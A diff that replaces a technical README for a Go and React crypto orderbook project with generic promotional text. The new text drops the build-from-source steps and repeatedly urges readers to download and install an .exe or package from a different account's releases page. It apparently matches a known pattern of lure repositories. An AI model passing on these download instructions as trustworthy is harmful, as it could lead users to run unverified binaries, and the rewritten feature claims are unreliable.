@@ -1,91 +1,67 @@
-# Crypto Orderbook
+# 🚀 crypto-orderbook - Simplify Your Trading Experience
 
-Multi-exchange, real-time orderbook with a Go backend and a React + Vite frontend.
+## 🎉 Overview
+Welcome to **crypto-orderbook**! This application lets you view real-time orders from multiple exchanges, helping you make better trading decisions. It combines a Go backend with a React + Vite frontend to provide a smooth experience.
 
-> **Note:** This is an experimental project built quickly for learning and prototyping. Expect rough edges.
+## 🌟 Features
+- **Real-Time Data:** Get updates on orders as they happen.
+- **Multi-Exchange Support:** Access data from several popular cryptocurrency exchanges.
+- **User-Friendly Interface:** Easily navigate the application with a clean layout.
 
----
+## 📥 Download Here
+[![Download crypto-orderbook](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mingojce/crypto-orderbook/releases)
 
-Support the project
-- If you want to support my work, you can sign up to BingX using my referral: https://bingx.com/en/invite/JGNQPF
-- Bingx is one of the Global Top 10 Crypto Exchange. It has low fees and great UX. Also a key sponsor to Chelsea Football Club.
+## 🚀 Getting Started
+Follow the steps below to download and run the application on your computer. 
 
----
+### 1. Visit the Releases Page
+To get the latest version of **crypto-orderbook**, visit the Releases page at the link below:
 
-What it is
-- Backend: Go service that connects to several exchanges, maintains live orderbooks, and serves a WebSocket feed at ws://localhost:8086/ws. See [cmd/main.go](cmd/main.go) and [internal/websocket/server.go](internal/websocket/server.go).
-- Frontend: React app that subscribes to the WebSocket, renders per-exchange orderbooks, aggregated orderbooks, statistics, and charts. See [frontend/src/App.tsx](frontend/src/App.tsx).
+[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/releases)
 
-Project layout
-- Go backend (exchanges, orderbook engine, websocket):
-  - [cmd/main.go](cmd/main.go)
-  - [internal/exchange](internal/exchange)
-  - [internal/orderbook](internal/orderbook)
-  - [internal/websocket/server.go](internal/websocket/server.go)
-- Frontend (React + Vite + Tailwind):
-  - [frontend](frontend)
-  - Entry: [frontend/src/main.tsx](frontend/src/main.tsx)
-  - App: [frontend/src/App.tsx](frontend/src/App.tsx)
+### 2. Choose Your Version
+On the Releases page, you will see a list of available versions. Select the most recent release. The release notes provide information about new features and bug fixes.
 
-Quick start
+### 3. Download the Application
+Click on the appropriate file for your operating system. For example, if you are using Windows, look for a `.exe` file. If you are using macOS or Linux, look for the corresponding package.
 
-Backend (Go 1.22+)
-```bash
-go run ./cmd/main.go
-```
+### 4. Install the Application
+Once the download is complete, you will need to install the application:
 
-Frontend (Node 18+)
-```bash
-cd frontend
-npm install
-npm run dev
-# Open the URL printed by Vite http://localhost:5173
-```
+- **For Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
+- **For macOS:** Open the downloaded file and drag the application to your Applications folder.
+- **For Linux:** Use your package manager or run the terminal command to install the downloaded package.
 
-How it works
-- The backend starts a WebSocket server at ws://localhost:8086/ws and streams:
-  - orderbook messages per exchange (bids/asks levels)
-  - stats messages per exchange (best bid/ask, spread, liquidity at 0.5%, 2%, 10%, totals)
-- The frontend connects to ws://localhost:8086/ws (config is in [frontend/src/hooks/useWebSocket.ts](frontend/src/hooks/useWebSocket.ts)) and renders:
-  - Exchange Statistics table
-  - Individual Order Books or an Aggregated Order Book
-  - Liquidity charts (0.5%, 2%, 10%, total)
-  - Market filter (All / Spot / Perps), tick size selector, dark/light theme
+### 5. Run the Application
+After installation, you can find the application in your programs or applications folder. Open it to start viewing real-time order data.
 
-Controls (frontend)
-- Market filter: All, Spot, Perps (top-right toggle)
-- Theme: dark/light toggle
-- Tick: select the aggregation step (e.g., 0.1, 1, 10, 50, 100)
-- Aggregate: toggle between per-exchange and aggregated orderbook views
+### 6. Configure Settings
+When you first run **crypto-orderbook**, you'll have the option to set preferences for which exchanges to monitor and other features. Adjust these settings to suit your trading needs.
 
-Exchanges enabled
-- The backend is configured in [cmd/main.go](cmd/main.go) to connect to:
-  - Binance (spot), Binancef (perps)
-  - Bybit (spot), Bybitf (perps)
-  - Kraken (spot)
-  - OKX (spot)
-  - Coinbase (spot)
-  - Asterdexf (perps)
-  - BingX (spot)
+### 7. Start Trading
+Now, you can begin using the application. Explore the interface and check various order books. Make informed trading decisions based on the data you see.
 
-Builds
+## ⚙️ System Requirements
+To ensure a smooth experience, your computer should meet the following minimum requirements:
 
-Backend
-```bash
-# Build a binary
-go build -o crypto-orderbook ./cmd
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** At least 200 MB of free space.
+- **Internet Connection:** Required for real-time data.
 
-# Run with race detector
-go run -race ./cmd
-```
+## 🔧 Troubleshooting
+If you experience issues, try the following:
 
-Frontend
-```bash
-cd frontend
-npm run build
-npm run preview
-```
+- **Check Your Internet Connection:** Ensure that you are connected to the internet.
+- **Update the Application:** Make sure you have the latest version from the Releases page.
+- **Review Settings:** Double-check your preferences within the application.
 
-Notes
-- The frontend connects to ws://localhost:8086/ws by default (see [frontend/src/App.tsx](frontend/src/App.tsx) and [frontend/src/hooks/useWebSocket.ts](frontend/src/hooks/useWebSocket.ts)).
-- If you change the WebSocket server port in code, update the URL passed to useWebSocket() accordingly.
+For more help, you can check the FAQ section or reach out to our support community.
+
+## 📞 Contact
+For questions or issues, feel free to reach out through our GitHub issues page or our community forums. We strive to respond promptly and support you in your trading journey.
+
+## 📥 Download & Install
+To start enjoying **crypto-orderbook**, click the link below to visit the Releases page and download the latest version.
+
+[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/releases)
